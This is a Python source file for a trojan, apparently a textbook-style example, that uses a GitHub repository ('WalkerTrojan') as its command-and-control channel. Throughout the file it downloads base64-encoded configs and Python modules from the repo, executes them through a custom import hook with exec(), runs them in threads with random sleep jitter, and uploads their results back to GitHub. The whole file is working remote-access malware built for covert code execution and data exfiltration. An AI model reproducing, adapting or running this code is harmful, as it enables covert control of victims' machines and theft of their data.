import github3
import json
import base64
import sys
from datetime import datetime
import random
import threading
import time
import importlib

def connect_github():
    with open("mytoken.txt") as f:
        token = f.read()
    
    sess = github3.login(token=token)
    user = 'Kirubel1422'

    return sess.repository(user, 'WalkerTrojan')


def get_file_content(dirname, modulename, repo):
    return repo.file_contents(f"{dirname}/{modulename}").content

class Trojan:
    def __init__(self, trojan_id):
        self.trojan_id = trojan_id
        self.config_file = f'{trojan_id}.json'
        self.repo = connect_github()
    
    def get_config(self):
        try:
            config_json = get_file_content('configs', self.config_file, self.repo)
            config = json.loads(base64.b64decode(config_json))

            for task in config:
                if task['module'] not in sys.modules:
                    exec(f'import {task["module"]}')         
            return config
        except github3.exceptions.NotFoundError as nfe:
            print(f'[-] {self.config_file} not found in configs dir: {nfe}')
        except json.decoder.JSONDecodeError as jde:
            print(f'[-] Failed to decode: {jde}')
        except Exception as e:
            print(f'[-] Something went wrong in getting configuration file: {e}')
        
        return None
    
    def module_runner(self, module_name):
        result = sys.modules[module_name].run()
        self.store_result(result)
    
    def store_result(self, result):
        # Commit Message
        message = datetime.now().isoformat()
        remote_path = f'data/{self.trojan_id}-{message}.data'
        try:
            if result is not None:
                bin_result = base64.b64encode(bytes(str(result), 'utf-8'))
                self.repo.create_file(remote_path, message, bin_result)
            else:
                print('[-] Can\'t store empty data to github')
                return
        except Exception as e:
            print(f'[-] Failed to store result {e}')

    def run(self):
        while True:
            config = self.get_config()

            for task in config:
                t = threading.Thread(target=self.module_runner, args=(task['module'],))
                t.start()
                time.sleep(random.randint(1, 10))
            
            time.sleep(random.randint(600, 1800))

class GitImporter:
    def __init__(self):
        self.module_code = ""

    def find_module(self, name, path=None):
        print(f'[*] Attempting to retrieve {name}')
        self.repo = connect_github()
        
        try:
            module_content = get_file_content('modules', name + ".py", self.repo)
            
            if module_content is not None:
                self.module_code = base64.b64decode(module_content)
                return self
            else:
                return None
        except github3.exceptions.NotFoundError as nfe:
            print(f'[-] {module_content} not found in your repo at modules/')
        except Exception as e:
            print(f'[-] Something went wrong while finding module: {e}')
        return None
    
    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
        new_module = importlib.util.module_from_spec(spec)
        exec(self.module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        return new_module

if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    tro = Trojan("config")
    tro.run()